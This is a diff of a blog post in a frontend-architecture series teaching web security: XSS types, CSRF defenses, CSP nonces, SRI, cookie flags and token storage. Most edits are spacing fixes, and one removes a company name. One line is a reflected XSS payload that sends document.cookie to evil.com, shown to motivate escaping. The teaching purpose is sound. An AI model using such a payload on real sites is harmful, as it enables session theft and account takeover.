@@ -10,11 +10,11 @@ import AIAsk from '../../../components/Blog/AIAsk.astro';
 
 ## Introduction
 
-Should a frontend architect understand security? My answer is **yes** — not to be a security engineer, but to establish the baseline of "all user input is untrusted, all cross-origin needs validation". Three reasons:
+Should a frontend architect understand security? My answer is **yes**— not to be a security engineer, but to establish the baseline of "all user input is untrusted, all cross-origin needs validation". Three reasons:
 
-1. **XSS / CSRF are OWASP Top 10 regulars.** One XSS vulnerability can let attackers take over any user account; one CSRF can make users unknowingly transfer money.
-2. **Security lines are often bypassed for "dev efficiency".** `v-html` / `dangerouslySetInnerHTML` / `eval()` are convenient, but 90% of security incidents come from "unexpected input" to these APIs.
-3. **Architect's security design determines the whole defense line.** How to configure CSP, validate SRI, set SameSite cookies, manage CORS whitelist — these are **architectural** decisions, not single-file patches.
+1. **XSS / CSRF are OWASP Top 10 regulars.**One XSS vulnerability can let attackers take over any user account; one CSRF can make users unknowingly transfer money.
+2. **Security lines are often bypassed for "dev efficiency".**`v-html` / `dangerouslySetInnerHTML` / `eval()` are convenient, but 90% of security incidents come from "unexpected input" to these APIs.
+3. **Architect's security design determines the whole defense line.**How to configure CSP, validate SRI, set SameSite cookies, manage CORS whitelist — these are **architectural**decisions, not single-file patches.
 
 This is post #5 of the *Frontend Architecture Cultivation Path* series. We skip cryptographic details (no AES internals), use attack cases + defense code + real incident postmortems to make XSS / CSRF / CSP / SRI / Cookie the five major topics concrete. The next post covers TypeScript advanced topics and type gymnastics.
 
@@ -31,9 +31,9 @@ XSS is when **attackers inject JS code into victim pages for execution**. Three 
 
 | Type | Attack vector | Blast radius | Fix difficulty |
 |---|---|---|---|
-| Stored XSS | Comments / avatars / usernames in DB | **All visitors** | Medium |
-| Reflected XSS | Malicious query params in email / phishing links | **Specific victims** | Medium |
-| DOM-based XSS | Frontend JS puts untrusted data into dangerous APIs | **Specific victims** | **High** (hard to spot) |
+| Stored XSS | Comments / avatars / usernames in DB | **All visitors**| Medium |
+| Reflected XSS | Malicious query params in email / phishing links | **Specific victims**| Medium |
+| DOM-based XSS | Frontend JS puts untrusted data into dangerous APIs | **Specific victims**| **High**(hard to spot) |
 
 ### 1.2 Reflected XSS Attack Case
 
@@ -41,7 +41,7 @@ XSS is when **attackers inject JS code into victim pages for execution**. Three 
 GET /search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
 ```
 
-If the server **renders `q` directly back into the page** (`<p>Search results: <%= q %></p>`), an attacker constructs this link and sends to victims; click it → JS executes → **cookie sent to evil.com**.
+If the server **renders `q` directly back into the page**(`<p>Search results: <%= q %></p>`), an attacker constructs this link and sends to victims; click it → JS executes → **cookie sent to evil.com**.
 
 **Fix: must escape / sanitize**:
 
@@ -104,7 +104,7 @@ const clean = DOMPurify.sanitize(userInput, { ALLOWED_TAGS: [] }); // strip all 
 
 ## 2. CSRF: Cross-Site Request Forgery
 
-CSRF is when **attackers trick victims into making unintended requests on sites they're logged into** — victim doesn't know, server thinks it's the user's action.
+CSRF is when **attackers trick victims into making unintended requests on sites they're logged into**— victim doesn't know, server thinks it's the user's action.
 
 ### 2.1 Classic Attack Chain
 
@@ -142,7 +142,7 @@ if (req.headers.origin !== 'https://bank.com') {
 # Re-prompt password / 2FA before transfer / password change
 ```
 
-**Production case**: SF Express SSO system enforced `SameSite=Lax` + Double Submit Cookie + Origin check triple-belt; CSRF reports dropped from dozens per month to zero.
+**Production case**:  SSO system enforced `SameSite=Lax` + Double Submit Cookie + Origin check triple-belt; CSRF reports dropped from dozens per month to zero.
 
 ### 2.3 SameSite Three Values
 
@@ -152,11 +152,11 @@ if (req.headers.origin !== 'https://bank.com') {
 | `Lax` (default) | ✅ carries | ❌ doesn't carry | ❌ doesn't carry |
 | `None` | ✅ carries | ✅ carries | ✅ carries |
 
-**Architect rule**: **OAuth third-party callback must use `None + Secure`** (otherwise the redirect drops cookies), **others use `Lax`**.
+**Architect rule**: **OAuth third-party callback must use `None + Secure`**(otherwise the redirect drops cookies), **others use `Lax`**.
 
 ## 3. CSP: Content Security Policy
 
-CSP is the browser's **defense-in-depth mechanism** — even if XSS has happened, it can still prevent malicious scripts from executing.
+CSP is the browser's **defense-in-depth mechanism**— even if XSS has happened, it can still prevent malicious scripts from executing.
 
 ### 3.1 CSP Directives Cheat Sheet
 
@@ -175,7 +175,7 @@ Content-Security-Policy:
 
 ### 3.2 Real Deployment: Nonce Mode
 
-**The most recommended modern approach** — server generates a one-time nonce per response, inline scripts must carry that nonce to execute:
+**The most recommended modern approach**— server generates a one-time nonce per response, inline scripts must carry that nonce to execute:
 
 ```typescript
 // Express middleware
@@ -203,7 +203,7 @@ app.use((req, res, next) => {
 <script>alert('blocked')</script>
 ```
 
-**Production case**: after enabling CSP, an e-commerce site's **XSS attack success rate dropped from 60% to 0** — even if attackers injected scripts, no nonce means they couldn't run.
+**Production case**: after enabling CSP, an e-commerce site's **XSS attack success rate dropped from 60% to 0**— even if attackers injected scripts, no nonce means they couldn't run.
 
 ### 3.3 CSP Report-Only Mode (Observe Before Enforce)
 
@@ -232,8 +232,8 @@ Content-Security-Policy: ...;
 ```
 
 **Production rules**:
-- **Third-party libraries** (jQuery / Vue / React) must have SRI
-- **Self-hosted resources** go through your CDN / hashed build artifacts; adding SRI is even safer
+- **Third-party libraries**(jQuery / Vue / React) must have SRI
+- **Self-hosted resources**go through your CDN / hashed build artifacts; adding SRI is even safer
 
 **Note**: SRI requires `crossorigin="anonymous"`, otherwise cross-origin resources can't be validated.
 
@@ -255,7 +255,7 @@ Set-Cookie: session=abc123;
 |---|---|
 | Session Cookie | `HttpOnly + Secure + SameSite=Lax + Max-Age=session` |
 | OAuth callback Cookie | `HttpOnly + Secure + SameSite=None + Max-Age=600` |
-| Analytics / tracking Cookie | **Don't set HttpOnly** (JS needs to read) + `SameSite=Lax + Max-Age=365*24*3600` |
+| Analytics / tracking Cookie | **Don't set HttpOnly**(JS needs to read) + `SameSite=Lax + Max-Age=365*24*3600` |
 | Cross-subdomain shared Session | `Domain=.example.com` |
 
 ## 6. Token Storage Strategy: localStorage vs Cookie vs Memory
@@ -264,10 +264,10 @@ Where to store JWT / access tokens, **architects must decide**:
 
 | Storage | XSS risk | CSRF risk | Recommended scenario |
 |---|---|---|---|
-| `localStorage` | **High** (JS readable, XSS one-line steal) | Low (not auto-sent) | ❌ Not recommended |
-| `sessionStorage` | **High** | Low | Short sessions, non-sensitive |
-| **HttpOnly Cookie** | Low | High (auto-sent) | **Recommended**, pair with SameSite for CSRF |
-| Memory (variable) | **Zero** (lost on refresh) | Zero | Short sessions + high sensitivity |
+| `localStorage` | **High**(JS readable, XSS one-line steal) | Low (not auto-sent) | ❌ Not recommended |
+| `sessionStorage` | **High**| Low | Short sessions, non-sensitive |
+| **HttpOnly Cookie**| Low | High (auto-sent) | **Recommended**, pair with SameSite for CSRF |
+| Memory (variable) | **Zero**(lost on refresh) | Zero | Short sessions + high sensitivity |
 
 **Architect decision**: JWT default storage is **HttpOnly Cookie + SameSite=Lax**. localStorage only when: ① third-party SDK requires JS read ② XSS attack surface already closed (strict CSP).
 
@@ -291,24 +291,24 @@ package.json doesn't write "latest", write specific versions
 
 ## 8. Pitfall Reminders (Senior Architects Please Read Carefully)
 
-1. **`v-html` / `dangerouslySetInnerHTML` are not "dev tools", they're XSS fuses.** Every use must sanitize. **Rule**: if `textContent` works, don't use `innerHTML`.
-2. **Don't trust "front-end escape is enough".** User input should be escaped at **storage-side + render-side + DOM-operation-side**. Miss any one and there's risk.
-3. **Don't put CSRF Token in URL.** `/api?token=xxx` leaks through Referer header to third parties. **Must go in Header or POST body**.
-4. **Don't disable CSP in production.** "CSP is too strict and breaks functionality" is an excuse — **first Report-Only for 1 week, then enforce**.
-5. **Don't conflate "front-end security" and "back-end security".** Front-end can do: XSS defense / CSP / SameSite Cookie / SRI. **Real authentication, permission verification, sensitive operations must be done server-side**.
+1. **`v-html` / `dangerouslySetInnerHTML` are not "dev tools", they're XSS fuses.**Every use must sanitize. **Rule**: if `textContent` works, don't use `innerHTML`.
+2. **Don't trust "front-end escape is enough".**User input should be escaped at **storage-side + render-side + DOM-operation-side**. Miss any one and there's risk.
+3. **Don't put CSRF Token in URL.**`/api?token=xxx` leaks through Referer header to third parties. **Must go in Header or POST body**.
+4. **Don't disable CSP in production.**"CSP is too strict and breaks functionality" is an excuse — **first Report-Only for 1 week, then enforce**.
+5. **Don't conflate "front-end security" and "back-end security".**Front-end can do: XSS defense / CSP / SameSite Cookie / SRI. **Real authentication, permission verification, sensitive operations must be done server-side**.
 
 ## Summary
 
 Eight key facts that thread front-end security together:
 
 - **XSS three types**: Stored (DB injection) / Reflected (URL injection) / DOM-based (frontend JS), each with different defenses.
-- **escape + sanitize** + CSP fallback is the XSS defense trio.
+- **escape + sanitize**+ CSP fallback is the XSS defense trio.
 - **CSRF defense**: SameSite Cookie + CSRF Token + Origin check + critical op re-auth.
-- **CSP nonce mode** is the modern most-recommended defense-in-depth approach.
-- **SRI** validates CDN resource integrity, prevents supply-chain attacks.
+- **CSP nonce mode**is the modern most-recommended defense-in-depth approach.
+- **SRI**validates CDN resource integrity, prevents supply-chain attacks.
 - **Cookie three-piece set**: `HttpOnly + Secure + SameSite`, OAuth uses `None + Secure`.
 - **Token stored in HttpOnly Cookie**, not localStorage.
-- **Dependency scanning** (npm audit) + lock files, prevents supply-chain attacks.
+- **Dependency scanning**(npm audit) + lock files, prevents supply-chain attacks.
 
 **Next post**: TypeScript advanced — type gymnastics and project practice, ERP / FinUI / Electron TypeScript experience summary.
 
@@ -318,7 +318,7 @@ Eight key facts that thread front-end security together:
 
 > **Q1 (Answer)**: What's the difference between the three XSS types? How do you defend each?
 >
-> **A**: **Stored XSS**: malicious code enters the database (comments / avatars / usernames), affects all visitors; defense is **sanitize before storage** + escape before render + CSP. **Reflected XSS**: malicious code is in URL parameters, requires tricking victim into clicking; defense is **escape before render** of all user input + CSP. **DOM-based XSS**: pure frontend JS puts untrusted data into `innerHTML` / `eval` / `document.write`, never touches server; defense is **switch to `textContent`** or DOMPurify sanitize. **Interview tip**: cite "rendering `location.hash` via `innerHTML`" as the classic counter-example.<AIAsk question="What's the difference between the three XSS types? How do you defend each?" lang="en" />
+> **A**: **Stored XSS**: malicious code enters the database (comments / avatars / usernames), affects all visitors; defense is **sanitize before storage**+ escape before render + CSP. **Reflected XSS**: malicious code is in URL parameters, requires tricking victim into clicking; defense is **escape before render**of all user input + CSP. **DOM-based XSS**: pure frontend JS puts untrusted data into `innerHTML` / `eval` / `document.write`, never touches server; defense is **switch to `textContent`**or DOMPurify sanitize. **Interview tip**: cite "rendering `location.hash` via `innerHTML`" as the classic counter-example.<AIAsk question="What's the difference between the three XSS types? How do you defend each?" lang="en" />
 >
 > **Q2 (Think)**: What's the CSRF attack chain? How do you choose between the three SameSite values? Why must OAuth third-party callbacks use None?<AIAsk question="What's the CSRF attack chain? How do you choose between the three SameSite values? Why must OAuth third-party callbacks use None?" lang="en" />
 >
